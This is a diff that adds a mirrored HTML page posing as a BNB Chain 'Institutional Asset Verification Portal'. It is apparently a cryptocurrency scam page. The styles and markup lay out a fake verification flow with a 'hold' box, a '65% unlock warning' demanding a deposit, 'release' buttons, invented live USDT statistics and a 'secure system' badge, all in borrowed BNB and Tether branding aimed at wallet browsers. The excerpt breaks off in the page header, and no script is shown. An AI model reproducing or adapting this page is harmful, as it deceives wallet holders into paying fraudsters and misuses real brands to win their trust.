@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="en">
+  
+<!-- Mirrored from https://bnbxt.org/ by HTTrack Website Copier/3.x [XR&CO], Sun, 11 Oct 2026 05:06:34 GMT -->
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+      BNB Chain | Institutional Asset Verification Portal
+    </title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/" />
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&amp;family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet" />
+    <meta name="dapp-browser" content="trust" />
+    <style>
+      :root {
+            --bnb-yellow: #F3BA2F;
+            --bnb-gold: #FFD700;
+            --bnb-dark: #0B0E11;
+            --bnb-black: #050607;
+            --bnb-gray: #1E2329;
+            --text-main: #EAECEF;
+            --text-dim: #848E9C;
+            --border: rgba(243, 186, 47, 0.2);
+            --glass: rgba(20, 21, 26, 0.95);
+
+            /* Semantic theme vars (DARK default) */
+            --bg: #0B0E11;
+            --bg-panel: #1E2329;
+            --bg-soft: rgba(255,255,255,0.02);
+            --bg-soft-2: rgba(255,255,255,0.03);
+            --heading: #ffffff;
+            --text: #EAECEF;
+            --text-dim2: #848E9C;
+            --border-soft: rgba(255,255,255,0.05);
+            --border-line: rgba(243, 186, 47, 0.2);
+            --nav-bg: rgba(20, 21, 26, 0.95);
+            --footer-bg: #000000;
+            --footer-panel: #1E2329;
+            --btn-view-bg: #1a2333;
+            --btn-view-text: #ffffff;
+            --pill-bg: #0f1f16;
+            --pill-border: #1e3a2b;
+            --slide-bg: linear-gradient(145deg, rgba(255,255,255,0.04), rgba(255,255,255,0.01));
+            --slide-border: rgba(255,255,255,0.06);
+            --slider-bg: rgba(0,0,0,0.2);
+            --shadow-card: rgba(0,0,0,0.6);
+            --icon-bg: #23190a;
+            --strong-light: #ffffff;
+            /* Distinct Live Stats widget background */
+            --hero-widget-bg: linear-gradient(180deg, rgba(243,186,47,0.08), rgba(20,21,26,0) 40%), #15181d;
+            --hero-widget-border: rgba(243,186,47,0.45);
+            --hero-widget-glow: 0 20px 60px rgba(0,0,0,0.55);
+        }
+
+        /* Light mode — follows device theme via prefers-color-scheme */
+        @media (prefers-color-scheme: light) {
+            :root {
+                --bg: #f5f6f8;
+                --bg-panel: #ffffff;
+                --bg-soft: rgba(0,0,0,0.02);
+                --bg-soft-2: rgba(0,0,0,0.03);
+                --heading: #0B0E11;
+                --text: #12161b;
+                --text-dim2: #5b6673;
+                --border-soft: rgba(11,14,17,0.08);
+                --border-line: rgba(240,185,11,0.5);
+                --nav-bg: rgba(255,255,255,0.92);
+                --footer-bg: #0B0E11;
+                --footer-panel: #1E2329;
+                --btn-view-bg: #e9eef5;
+                --btn-view-text: #0B0E11;
+                --pill-bg: #e6f5ee;
+                --pill-border: #bfe8d6;
+                --slide-bg: linear-gradient(145deg, rgba(255,255,255,0.9), rgba(255,255,255,0.6));
+                --slide-border: rgba(11,14,17,0.08);
+                --slider-bg: rgba(11,14,17,0.03);
+                --shadow-card: rgba(11,14,17,0.15);
+                --icon-bg: #fbf2dc;
+                --strong-light: #0B0E11;
+                /* Distinct Live Stats widget background (light) */
+                --hero-widget-bg: linear-gradient(180deg, rgba(243,186,47,0.10), rgba(255,255,255,0) 45%), #ffffff;
+                --hero-widget-border: rgba(240,185,11,0.55);
+                --hero-widget-glow: 0 18px 50px rgba(240,185,11,0.14);
+            }
+            /* Soften decorative globe so it never overshadows the light hero */
+            .web3-hero .hero-globe { opacity: 0.35; }
+            .hero-band { background: var(--bg); }
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scroll { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .reveal { animation: fadeIn 1s forwards; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 25px; }
+
+        /* Navigation */
+        nav {
+            background: var(--nav-bg);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border-line);
+            padding: 18px 0;
+            position: sticky; top: 0; z-index: 1000;
+        }
+        .nav-flex { display: flex; justify-content: space-between; align-items: center; }
+        .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; color: var(--heading); font-family: 'Sora'; font-weight: 800; font-size: 1.3rem; }
+        .logo img { width: 32px; height: 32px; }
+
+        /* Hero Heading — increased contrast */
+        .hero { text-align: center; padding: 60px 0 20px; }
+        .hero h1 { 
+            font-family: 'Sora'; 
+            font-size: clamp(2.5rem, 7vw, 4.5rem); 
+            font-weight: 800; 
+            line-height: 1.1; 
+            margin-bottom: 25px;
+            color: var(--heading);
+        }
+        .hero p { color: var(--text-dim2); max-width: 700px; margin: 0 auto; font-size: 1.1rem; }
+
+        /* Verification Card */
+        .hero-main { display: flex; flex-direction: column; align-items: center; padding-bottom: 80px; }
+        .verify-card {
+            background: var(--bg-panel);
+            border: 1px solid var(--bnb-yellow);
+            border-radius: 25px;
+            width: 100%;
+            max-width: 500px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px var(--shadow-card);
+            min-height: 450px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .bnb-symbol { width: 100px; height: 100px; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center; background: rgba(243, 186, 47, 0.05); border-radius: 50%; border: 1px solid var(--border-line); }
+        .bnb-symbol img { width: 60px; filter: drop-shadow(0 0 10px var(--bnb-yellow)); }
+
+        .btn-verify { 
+            background: linear-gradient(90deg, #F3BA2F, #FFD700); 
+            color: #000; width: 100%; padding: 22px; border-radius: 12px; border: none; 
+            font-size: 1.25rem; font-weight: 800; cursor: pointer; text-transform: capitalize; 
+            transition: 0.3s;
+        }
+        .btn-verify:disabled { opacity: 0.8; }
+
+        /* --- REPORT PAGE STYLES --- */
+        #reportPage { display: none; text-align: center; }
+        .warn-icon { font-size: 45px; color: #F3BA2F; margin-bottom: 15px; display: block; }
+        .rep-title-new { font-family: 'Sora'; font-size: 1.8rem; font-weight: 700; color: var(--heading); margin-bottom: 8px; }
+        .rep-subtitle-new { color: var(--text-dim2); font-size: 0.95rem; margin-bottom: 25px; line-height: 1.4; }
+
+        .rep-hold-box { background: var(--bg-soft); border: 1px solid rgba(243, 186, 47, 0.2); border-radius: 15px; padding: 20px; margin-bottom: 20px; }
+        .rep-hold-box span { color: var(--text-dim2); font-size: 0.85rem; display: block; margin-bottom: 5px; }
+        .rep-hold-box strong { font-size: 1.8rem; font-weight: 800; color: #F3BA2F; }
+
+        .rep-info-alert { background: rgba(243, 186, 47, 0.1); border-radius: 12px; padding: 15px; text-align: left; margin-bottom: 20px; display: flex; gap: 10px; align-items: flex-start; }
+        .rep-info-alert i { color: #F3BA2F; font-style: normal; font-weight: bold; }
+        .rep-info-alert p { color: #F3BA2F; font-size: 0.82rem; line-height: 1.4; margin: 0; }
+
+        .rep-pending { display: flex; align-items: center; justify-content: center; gap: 8px; color: var(--heading); font-size: 0.95rem; font-weight: 600; margin-bottom: 25px; }
+        .rep-dot { width: 10px; height: 10px; background: #F3BA2F; border-radius: 50%; box-shadow: 0 0 10px #F3BA2F; }
+
+        .btn-view-tx { background: var(--btn-view-bg); color: var(--btn-view-text); width: 100%; padding: 16px; border-radius: 12px; border: none; font-size: 1rem; font-weight: 600; cursor: pointer; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-view-tx svg { width: 18px; fill: currentColor; }
+
+        .btn-release-gold { background: linear-gradient(90deg, #F3BA2F, #d4a017); color: #000; width: 100%; padding: 16px; border-radius: 12px; border: none; font-size: 1.1rem; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+
+        /* --- 65% UNLOCK WARNING UI (PREMIUM) --- */
+        #unlockWarningUI { display: none; text-align: center; animation: fadeIn 0.5s ease-out; }
+        .sec-header { color: #ff4444; font-weight: 800; font-size: 1.2rem; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        .sec-msg { color: var(--text-dim2); font-size: 0.9rem; margin-bottom: 25px; line-height: 1.6; text-align: left; background: var(--bg-soft-2); padding: 15px; border-left: 4px solid #F3BA2F; border-radius: 4px; }
+        .calc-box { background: rgba(243, 186, 47, 0.05); border: 2px dashed rgba(243, 186, 47, 0.4); border-radius: 20px; padding: 25px; margin-bottom: 25px; }
+        .calc-box span { color: var(--text-dim2); font-size: 0.85rem; display: block; margin-bottom: 8px; }
+        .calc-box strong { font-size: 2.2rem; color: #F3BA2F; font-family: 'Sora'; font-weight: 800; }
+        .btn-deposit-now { background: #F3BA2F; color: #000; width: 100%; padding: 20px; border-radius: 12px; border: none; font-size: 1.1rem; font-weight: 800; cursor: pointer; box-shadow: 0 10px 30px rgba(243, 186, 47, 0.2); transition: 0.3s; }
+        .btn-deposit-now:hover { transform: translateY(-3px); }
+
+        .btn-close-link { color: var(--heading); background: none; border: none; margin-top: 20px; font-size: 0.95rem; cursor: pointer; opacity: 0.7; position: relative; overflow: hidden; }
+        .btn-close-link::after { content: ''; position: absolute; border-radius: 50%; background: rgba(240,185,11,0.4); transform: scale(0); animation: ripple 0.6s ease-out; pointer-events: none; }
+        @keyframes ripple { to { transform: scale(4); opacity: 0; } }
+        .loader-spin { width: 22px; height: 22px; border: 3px solid var(--border-soft); border-top: 3px solid var(--strong-light); border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-left: 10px; }
+
+        /* Number flip animation */
+        .flip-number { display: inline-flex; overflow: hidden; vertical-align: bottom; }
+        .flip-digit { display: inline-block; position: relative; width: 0.6em; text-align: center; transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); }
+        .flip-digit span { display: block; }
+
+        /* Slider */
+        /* Slider — upgraded cards with logos + sparklines */
+        .slider-section { padding: 40px 0; overflow: hidden; background: var(--slider-bg); border-top: 1px solid var(--border-line); border-bottom: 1px solid var(--border-line); }
+        .slider-section:hover .slider-track { animation-play-state: paused; }
+        .slider-track { display: flex; width: max-content; animation: scroll 60s linear infinite; }
+        .slide { width: 160px; height: 100px; margin: 0 12px; background: var(--slide-bg); border-radius: 16px; overflow: hidden; border: 1px solid var(--slide-border); flex-shrink: 0; padding: 16px 20px; display: flex; align-items: center; gap: 14px; position: relative; }
+        .slide::before { content: ''; position: absolute; inset: -1px; border-radius: 16px; background: linear-gradient(135deg, rgba(240,185,11,0.15), transparent 60%); opacity: 0; transition: opacity 0.4s; pointer-events: none; }
+        .slide:hover::before { opacity: 1; }
+        .slide-icon { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .slide-icon img { width: 32px; height: 32px; object-fit: contain; filter: drop-shadow(0 0 8px rgba(240,185,11,0.35)); }
+        .slide-icon svg { width: 32px; height: 32px; filter: drop-shadow(0 0 8px rgba(240,185,11,0.35)); }
+        .slide-name { font-family: 'Sora'; font-weight: 700; font-size: 0.95rem; color: var(--heading); white-space: nowrap; }
+
+        /* Footer */
+        footer { background: var(--footer-bg); padding: 80px 0 40px; border-top: 3px solid var(--bnb-yellow); text-align: center; }
+        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 60px; margin-bottom: 40px; }
+        .f-links h4 { color: var(--heading); font-family: 'Sora'; margin-bottom: 25px; text-transform: uppercase; font-size: 0.9rem; }
+        .f-links ul { list-style: none; }
+        .f-links li { margin-bottom: 12px; }
+        .f-links a { color: var(--text-dim2); text-decoration: none; transition: 0.3s; }
+        .f-links a:hover { color: var(--bnb-yellow); }
+
+        .social-row { display: flex; justify-content: center; gap: 15px; margin-top: 40px; padding-top: 30px; border-top: 1px solid var(--border-soft); }
+        .s-btn { width: 50px; height: 50px; background: var(--footer-panel); border-radius: 12px; display: flex; align-items: center; justify-content: center; transition: 0.3s; border: 1px solid var(--border-line); }
+        .s-btn:hover { background: var(--bnb-yellow); transform: translateY(-3px); }
+        .s-btn svg { width: 22px; fill: white; }
+        .s-btn:hover svg { fill: black; }
+
+        @media (max-width: 992px) { .f-grid { grid-template-columns: 1fr; text-align: center; } }
+        @media (max-width: 768px) {
+            .stats-block { display: none !important; }
+        }
+
+        /* ── NEW: Live Verification hero panel ── */
+        /* Continuous PLAIN background band (solid, no gradient/borders/corners) matching Verify Assets background */
+        .hero-band { position: relative; overflow: hidden; background: var(--bg); }
+        .web3-hero { position: relative; overflow: hidden; padding: 70px 0 40px; }
+        .hero-globe { position: absolute; right: -40px; top: -20px; width: 760px; height: 420px; pointer-events: none; opacity: 0.85; }
+        /* Prominent live panel hero — plain, shares band background */
+        .web3-hero .hero-live { position: relative; z-index: 2; max-width: 980px; margin: 0 auto; background: transparent; border: none; border-radius: 0; box-shadow: none; }
+        .hero-live .live-header { padding: 26px 34px; border-bottom: none; }
+        .hero-live .live-header-left { font-size: 1.2rem; }
+        .hero-live .live-cell { padding: 30px 34px; border-right: none; border-bottom: none; }
+        .hero-live .l-label { font-size: 0.9rem; margin-bottom: 14px; }
+        .hero-live .l-value { font-size: 1.7rem; }
+
+        /* ── NEW: Stats grid ── */
+        .stats-section { padding: 50px 0 0; }
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; max-width: 1200px; margin: 0 auto; }
+        .stat-card { background: var(--bg-panel); border: 1px solid var(--border-line); border-radius: 20px; padding: 28px 28px 24px; }
+        .stat-icon { width: 42px; height: 42px; border-radius: 10px; background: var(--icon-bg); display: flex; align-items: center; justify-content: center; color: var(--bnb-yellow); margin-bottom: 16px; }
+        .stat-value { font-family: 'Sora'; font-size: 1.9rem; font-weight: 800; letter-spacing: -0.5px; color: var(--heading); margin-bottom: 6px; }
+        .stat-label { font-size: 0.9rem; color: var(--text-dim2); margin-bottom: 10px; }
+        .stat-delta { font-size: 0.8rem; color: #16c784; font-weight: 600; }
+        /* Highlight the "trusted by millions" widget subtly */
+        .stat-trusted { background: linear-gradient(145deg, rgba(243,186,47,0.10), rgba(243,186,47,0.02)), var(--bg-panel); border-color: var(--bnb-yellow); }
+        .stat-trusted .stat-value { color: var(--bnb-yellow); }
+
+        /* ── NEW: Live verification panel ── */
+        .live-section { padding: 28px 0 0; }
+        .live-panel { background: var(--bg-panel); border: 1px solid var(--border-line); border-radius: 20px; overflow: hidden; box-shadow: 0 0 40px rgba(240,185,11,0.06); }
+        .live-header { display: flex; align-items: center; justify-content: space-between; padding: 20px 26px; border-bottom: 1px solid var(--border-line); gap: 12px; flex-wrap: wrap; }
+        .live-header-left { display: flex; align-items: center; gap: 10px; font-family: 'Sora'; font-size: 1rem; font-weight: 700; color: var(--heading); }
+        .usdt-badge { display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .usdt-badge svg { width: 110px; height: 30px; display: block; }
+        .live-pill { display: inline-flex; align-items: center; gap: 7px; background: var(--pill-bg); border: 1px solid var(--pill-border); color: #16c784; font-size: 0.75rem; font-weight: 700; padding: 6px 14px; border-radius: 100px; }
+        .live-dot { width: 7px; height: 7px; border-radius: 50%; background: #16c784; box-shadow: 0 0 0 0 rgba(22,199,132,.6); animation: livePulse 1.8s infinite; }
+        @keyframes livePulse { 0%{ box-shadow: 0 0 0 0 rgba(22,199,132,.55); } 70%{ box-shadow: 0 0 0 7px rgba(22,199,132,0); } 100%{ box-shadow: 0 0 0 0 rgba(22,199,132,0); } }
+        .live-grid { display: grid; grid-template-columns: repeat(4, 1fr); }
+        .live-cell { padding: 24px 26px; border-right: 1px solid var(--border-line); }
+        .live-cell:last-child { border-right: none; }
+        .live-cell .l-label { font-size: 0.85rem; color: var(--text-dim2); margin-bottom: 12px; }
+        .live-cell .l-value { font-family: 'Sora'; font-size: 1.3rem; font-weight: 800; letter-spacing: -0.4px; color: var(--bnb-yellow); margin-bottom: 8px; white-space: nowrap; }
+        .live-cell .l-delta { font-size: 0.78rem; color: #16c784; font-weight: 600; }
+        .live-cell .l-delta.muted { color: var(--text-dim2); font-weight: 500; }
+
+        @media (max-width: 992px) {
+            .hero-globe { width: 520px; height: 290px; right: -160px; top: 0; }
+            .stats-grid { grid-template-columns: 1fr 1fr; }
+            .live-grid { grid-template-columns: repeat(2, 1fr); }
+            .live-cell:nth-child(2) { border-right: none; }
+            .live-cell { border-bottom: 1px solid var(--border-line); }
+        }
+        @media (max-width: 640px) {
+            .hero-globe { display: none; }
+            .stats-grid { grid-template-columns: 1fr; }
+            /* Smart mobile: compact the live hero so Verify Assets appears sooner */
+            .web3-hero { padding: 26px 0; }
+            .hero-live .live-header { padding: 16px 18px; }
+            .hero-live .live-header-left { font-size: 1rem; }
+            .hero-live .live-cell { padding: 14px 14px; }
+            .hero-live .l-label { font-size: 0.72rem; margin-bottom: 8px; }
+            .hero-live .l-value { font-size: 1.05rem; }
+            .live-cell .l-value { white-space: normal; }
+            .live-cell .l-delta { font-size: 0.66rem; }
+            .live-grid { grid-template-columns: 1fr 1fr; }
+            .live-cell { border-right: 1px solid var(--border-line); border-bottom: 1px solid var(--border-line); }
+            .live-cell:nth-child(2n) { border-right: none; }
+            .live-cell:last-child { border-right: none; }
+            /* Pull the Verify section up on mobile */
+            .hero { padding: 34px 0 10px; }
+            .hero-main { padding-bottom: 40px; }
+        }
+    </style>
+  </head>
+  <body>
+    <nav>
+      <div class="container nav-flex">
+        <a href="#" class="logo" style="min-width: 97px;">        <svg width="319" height="56" viewBox="0 0 319 56" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:block; height:36px; width:auto;">
+<path d="M9.34249 8.57756L24.203 0L39.0634 8.57756L33.6 11.7463L24.203 6.33756L14.8059 11.7463L9.34249 8.57756ZM39.0634 19.3951L33.6 16.2263L24.203 21.6351L14.8059 16.2263L9.34249 19.3951V25.7327L18.7395 31.1415V41.959L24.203 45.1278L29.6664 41.959V31.1415L39.0634 25.7327V19.3951ZM39.0634 36.5502V30.2127L33.6 33.3815V39.719L39.0634 36.5502ZM42.9425 38.7902L33.5454 44.199V50.5366L48.4059 41.959V24.8039L42.9425 27.9727V38.7902ZM37.4791 13.9863L42.9425 17.1551V23.4927L48.4059 20.3239V13.9863L42.9425 10.8176L37.4791 13.9863ZM18.7395 46.4937V52.8312L24.203 56L29.6664 52.8312V46.4937L24.203 49.6624L18.7395 46.4937ZM9.34249 36.5502L14.8059 39.719V33.3815L9.34249 30.2127V36.5502ZM18.7395 13.9863L24.203 17.1551L29.6664 13.9863L24.203 10.8176L18.7395 13.9863ZM5.46341 17.1551L10.9268 13.9863L5.46341 10.8176L0 13.9863V20.3239L5.46341 23.4927V17.1551ZM5.46341 27.9727L0 24.8039V41.959L14.8605 50.5366V44.199L5.46341 38.7902V27.9727Z" fill="#F0B90B"/>
+<path d="M91.4781 35.1436V35.0545C91.4781 30.8694 89.252 28.7769 85.6457 27.3967C87.8718 26.1501 89.7418 24.1911 89.7418 20.6738V20.5848C89.7418 15.6873 85.8238 12.5262 79.4571 12.5262H64.9874V43.6918H79.8133C86.8478 43.6918 91.4781 40.8424 91.4781 35.1436ZM82.9299 21.8314C82.9299 24.1466 81.0154 25.126 77.9879 25.126H71.6657V18.5367H78.4331C81.3271 18.5367 82.9299 19.6943 82.9299 21.7423V21.8314ZM84.6662 34.2976C84.6662 36.6128 82.8408 37.6813 79.8133 37.6813H71.6657V30.8249H79.5907C83.1079 30.8249 84.6662 32.116 84.6662 34.2086V34.2976Z" fill="#F0B90B"/>
+<path d="M125.256 43.6918V12.5262H118.489V31.7153L103.886 12.5262H97.5634V43.6918H104.331V23.8794L119.424 43.6918H125.256Z" fill="#F0B90B"/>
+<path d="M159.674 35.1436V35.0545C159.674 30.8694 157.448 28.7769 153.841 27.3967C156.067 26.1501 157.937 24.1911 157.937 20.6738V20.5848C157.937 15.6873 154.019 12.5262 147.653 12.5262H133.183V43.6918H148.009C155.043 43.6918 159.674 40.8424 159.674 35.1436ZM151.126 21.8314C151.126 24.1466 149.211 25.126 146.184 25.126H139.861V18.5367H146.629C149.523 18.5367 151.126 19.6943 151.126 21.7423V21.8314ZM152.862 34.2976C152.862 36.6128 151.036 37.6813 148.009 37.6813H139.861V30.8249H147.786C151.304 30.8249 152.862 32.116 152.862 34.2086V34.2976Z" fill="#F0B90B"/>
+<path d="M200.996 38.1864L197.479 34.6246C194.808 37.1179 192.359 38.6762 188.53 38.6762C182.564 38.6762 178.246 33.6897 178.246 27.5456C178.246 21.4015 182.564 16.504 188.53 16.504C192.092 16.504 194.763 18.0623 197.257 20.3775L200.774 16.326C197.791 13.4765 194.318 11.473 188.575 11.473C179.136 11.473 172.502 18.7302 172.502 27.6346C172.502 36.6281 179.27 43.7072 188.352 43.7072C194.185 43.7072 197.746 41.5701 200.996 38.1864Z" fill="#F0B90B"/>
+<path d="M227.544 30.0388V43.1729H233.021V12.0073H227.544V24.9633H212.674V12.0073H207.198V43.1729H212.674V30.0388H227.544Z" fill="#F0B90B"/>
+<path d="M257.586 11.7847H252.511L238.798 43.1729H244.408L247.613 35.6486H262.35L265.511 43.1729H271.299L257.586 11.7847ZM260.347 30.7957H249.617L254.96 18.3295L260.347 30.7957Z" fill="#F0B90B"/>
+<path d="M277.401 12.0073V43.1729H282.877V12.0073H277.401Z" fill="#F0B90B"/>
+<path d="M313.436 33.5561L296.74 12.0073H291.665V43.1729H297.052V21.0008L314.238 43.1729H318.823V12.0073H313.436V33.5561Z" fill="#F0B90B"/>
+</svg>
+</a>
+        <div style="display:flex; align-items:center; gap:15px; height:36px;">
+          <div class="stats-block" style="font-size:0.85rem; color:var(--text-dim2); font-weight:500; white-space:nowrap; line-height:36px;">
+            <span id="live-count" style="color:var(--heading); font-weight:800; font-size:1rem; transition:color 0.15s; vertical-align:middle;">--</span>
+            <span style="color:var(--text-dim2); margin-left:4px; font-size:0.8rem; vertical-align:middle;">live stats</span>
+          </div>
+          <div style="font-size: 0.65rem; color: var(--bnb-yellow); font-weight: 800; display:flex; align-items:center; gap:6px; line-height:1.2; text-align:right;">
+            <span>SECURE<br>SYSTEM</span>
+            <span style="display:inline-block; width:5px; height:5px; border-radius:50%; background:#22c55e; box-shadow:0 0 5px rgba(34,197,94,0.8); flex-shrink:0;"></span>
+          </div>
+        </div>
+      </div>
+    </nav>
+    <!-- NEW: Continuous hero band (live stats + verify assets) -->
+    <section class="hero-band">
+    <!-- Live Verification Stats hero -->
+    <section class="web3-hero reveal">
+      <svg class="hero-globe" viewBox="0 0 700 560" fill="none" preserveAspectRatio="xMaxYMid slice">
+        <defs>
+          <radialGradient id="ambientGlow" cx="55%" cy="55%" r="55%">
+            <stop offset="0%" stop-color="#1a1206" stop-opacity="0.55"/>
+            <stop offset="100%" stop-color="#0a0a0a" stop-opacity="0"/>
+          </radialGradient>
+          <radialGradient id="planetBody" cx="38%" cy="30%" r="75%">
+            <stop offset="0%" stop-color="#1c2a38"/>
+            <stop offset="45%" stop-color="#0e1922"/>
+            <stop offset="100%" stop-color="#050a10"/>
+          </radialGradient>
+          <radialGradient id="landHaze" cx="42%" cy="68%" r="38%">
+            <stop offset="0%" stop-color="#F0B90B" stop-opacity="0.45"/>
+            <stop offset="55%" stop-color="#8a5c10" stop-opacity="0.18"/>
+            <stop offset="100%" stop-color="#F0B90B" stop-opacity="0"/>
+          </radialGradient>
+          <linearGradient id="rimLight" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0%" stop-color="#6fa8c9" stop-opacity="0.55"/>
+            <stop offset="100%" stop-color="#6fa8c9" stop-opacity="0"/>
+          </linearGradient>
+          <radialGradient id="nodeGlow" cx="50%" cy="50%" r="50%">
+            <stop offset="0%" stop-color="#FFDE7A" stop-opacity="1"/>
+            <stop offset="45%" stop-color="#F0B90B" stop-opacity="0.6"/>
+            <stop offset="100%" stop-color="#F0B90B" stop-opacity="0"/>
+          </radialGradient>
+          <clipPath id="sphereClip">
+            <circle cx="430" cy="430" r="320"/>
+          </clipPath>
+        </defs>
+        <g fill="#F0B90B">
+          <circle cx="90" cy="60" r="1.1" opacity="0.5"/>
+          <circle cx="180" cy="30" r="1.3" opacity="0.4"/>
+          <circle cx="40" cy="140" r="1" opacity="0.45"/>
+          <circle cx="260" cy="70" r="0.9" opacity="0.5"/>
+          <circle cx="620" cy="40" r="1.2" opacity="0.4"/>
+          <circle cx="560" cy="90" r="1" opacity="0.35"/>
+          <circle cx="150" cy="200" r="0.9" opacity="0.4"/>
+          <circle cx="20" cy="260" r="1.1" opacity="0.4"/>
+        </g>
+        <circle cx="420" cy="380" r="330" fill="url(#ambientGlow)"/>
+        <g opacity="0.06" transform="translate(560,60)">
+          <path d="M60 0L94 20L94 60L60 80L26 60L26 20Z" stroke="#F0B90B" stroke-width="3" fill="none"/>
+          <path d="M42 34l9 9-9 9-9-9 9-9z" fill="#F0B90B"/>
+          <path d="M78 34l9 9-9 9-9-9 9-9z" fill="#F0B90B"/>
+          <path d="M60 52l9 9-9 9-9-9 9-9z" fill="#F0B90B"/>
+          <path d="M60 16l9 9-9 9-9-9 9-9z" fill="#F0B90B"/>
+        </g>
+        <g opacity="0.04" transform="translate(600,180) scale(0.5)">
+          <path d="M60 0L94 20L94 60L60 80L26 60L26 20Z" stroke="#F0B90B" stroke-width="3" fill="none"/>
+        </g>
+        <g>
+          <circle cx="430" cy="430" r="320" fill="url(#planetBody)"/>
+          <circle cx="430" cy="430" r="320" fill="url(#landHaze)"/>
+          <g clip-path="url(#sphereClip)">
+            <ellipse cx="360" cy="330" rx="120" ry="60" fill="#2a2010" opacity="0.5"/>
+            <ellipse cx="470" cy="360" rx="90" ry="45" fill="#241c0c" opacity="0.45"/>
+            <ellipse cx="300" cy="400" rx="70" ry="38" fill="#1e1a10" opacity="0.4"/>
+            <ellipse cx="410" cy="280" rx="60" ry="30" fill="#241f14" opacity="0.35"/>
+            <g fill="#FFD866">
+              <circle cx="340" cy="320" r="1.4" opacity="0.9"/>
+              <circle cx="365" cy="335" r="1" opacity="0.7"/>
+              <circle cx="390" cy="310" r="1.2" opacity="0.8"/>
+              <circle cx="420" cy="340" r="1" opacity="0.6"/>
+              <circle cx="455" cy="355" r="1.3" opacity="0.85"/>
+              <circle cx="310" cy="360" r="0.9" opacity="0.6"/>
+              <circle cx="480" cy="330" r="1" opacity="0.65"/>
+            </g>
+          </g>
+          <path d="M180 260 A 320 320 0 0 1 690 380" stroke="url(#rimLight)" stroke-width="6" fill="none" opacity="0.5"/>
+          <circle cx="430" cy="430" r="320" fill="none" stroke="#3a4a58" stroke-width="1" opacity="0.35"/>
+        </g>
+        <g stroke="#F0B90B" fill="none" opacity="0.55">
+          <path d="M120 220 Q 320 40 560 160" stroke-width="1" opacity="0.5"/>
+          <path d="M180 300 Q 400 140 660 260" stroke-width="1" opacity="0.45"/>
+          <path d="M240 350 Q 420 260 620 330" stroke-width="0.8" opacity="0.4"/>
+          <path d="M280 250 Q 380 180 500 210" stroke-width="0.8" opacity="0.4"/>
+          <path d="M340 330 Q 450 300 560 340" stroke-width="0.8" opacity="0.45"/>
+          <path d="M200 270 Q 300 320 380 300" stroke-width="0.7" opacity="0.35"/>
+        </g>
+        <g>
+          <circle cx="120" cy="220" r="10" fill="url(#nodeGlow)"/>
+          <circle cx="120" cy="220" r="2.2" fill="#FFE9A8"/>
+          <circle cx="340" cy="330" r="16" fill="url(#nodeGlow)"/>
+          <circle cx="340" cy="330" r="3.4" fill="#FFE9A8"/>
+          <circle cx="560" cy="160" r="8" fill="url(#nodeGlow)"/>
+          <circle cx="560" cy="160" r="1.8" fill="#FFE9A8"/>
+          <circle cx="420" cy="340" r="12" fill="url(#nodeGlow)"/>
+          <circle cx="420" cy="340" r="2.6" fill="#FFE9A8"/>
+          <circle cx="620" cy="330" r="9" fill="url(#nodeGlow)"/>
+          <circle cx="620" cy="330" r="2" fill="#FFE9A8"/>
+          <circle cx="240" cy="350" r="7" fill="url(#nodeGlow)"/>
+          <circle cx="240" cy="350" r="1.6" fill="#FFE9A8"/>
+          <circle cx="500" cy="210" r="7" fill="url(#nodeGlow)"/>
+          <circle cx="500" cy="210" r="1.6" fill="#FFE9A8"/>
+          <circle cx="280" cy="250" r="6" fill="url(#nodeGlow)"/>
+          <circle cx="280" cy="250" r="1.4" fill="#FFE9A8"/>
+          <circle cx="660" cy="260" r="6" fill="url(#nodeGlow)"/>
+          <circle cx="660" cy="260" r="1.4" fill="#FFE9A8"/>
+        </g>
+      </svg>
+      <div class="container">
+        <div class="live-panel reveal hero-live">
+          <div class="live-header">
+            <div class="live-header-left">
+              <span class="usdt-badge" aria-hidden="true">
+                <svg viewBox="0 0 110 30" xmlns="http://www.w3.org/2000/svg"><circle cx="15" cy="15" r="15" fill="#50AF95"/><path d="M17 15.5v-1.7h3.2V10.6H9.8v3.2H13v1.7c-1.3.06-2.6.14-3.8.24v1.76c1.2-.1 2.5-.17 3.8-.24v1.7H9.8v1.85h6.4v-1.85H13v-1.7c1.3.07 2.6.15 3.8.24v-1.76c-1.2-.1-2.5-.18-3.8-.24z" fill="#fff" transform="translate(1.5 0)"/><text x="40" y="21" font-family="Inter, Arial, sans-serif" font-size="19" font-weight="800" fill="#50AF95" letter-spacing="0.5">Tether</text></svg>
+              </span>
+              Live Verification Stats (USDT)
+            </div>
+            <span class="live-pill"><span class="live-dot"></span>Live</span>
+          </div>
+          <div class="live-grid">
+            <div class="live-cell">
+              <div class="l-label">Total USDT Verified (Today)</div>
+              <div class="l-value" id="liveToday">$0</div>
